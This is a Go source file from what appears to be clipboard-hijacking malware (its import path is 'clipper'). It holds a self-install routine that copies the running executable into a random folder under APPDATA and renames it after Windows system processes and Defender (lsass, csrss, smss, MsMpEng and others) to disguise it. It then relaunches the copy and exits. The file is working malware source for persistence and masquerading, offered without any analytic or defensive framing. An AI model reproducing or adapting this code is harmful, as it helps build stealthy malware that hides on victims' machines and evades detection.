package install

import (
	"io"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"clipper/src/utils"
)

func InstallSelf() {
	exePath, err := utils.GetSelfPath()
	if err != nil {
		return
	}
	
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return
	}
	
	exeDir := filepath.Dir(exePath)
	if strings.HasPrefix(filepath.Clean(exeDir), filepath.Clean(appdata)) {
		return
	}
	
	entries, _ := os.ReadDir(appdata)
	var dirs []string
	for _, entry := range entries {
		if entry.IsDir() {
			dirs = append(dirs, filepath.Join(appdata, entry.Name()))
		}
	}
	
	if len(dirs) == 0 {
		return
	}
	
	names := []string{"msedgewebview2", "crss", "smss", "lsass", "csrss", "rundll32", "mmc", "spoolsv", "MsMpEng"}
	randomName := names[rand.Intn(len(names))]
	installDir := dirs[rand.Intn(len(dirs))]
	installedExe := filepath.Join(installDir, randomName+".exe")
	
	// fmt.Printf("Installing to %s\n", installedExe)
	
	in, _ := os.Open(exePath)
	out, _ := os.Create(installedExe)
	io.Copy(out, in)
	in.Close()
	out.Close()
	
	cmd := exec.Command(installedExe, os.Args[1:]...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	cmd.Start()
	
	os.Exit(0)
}
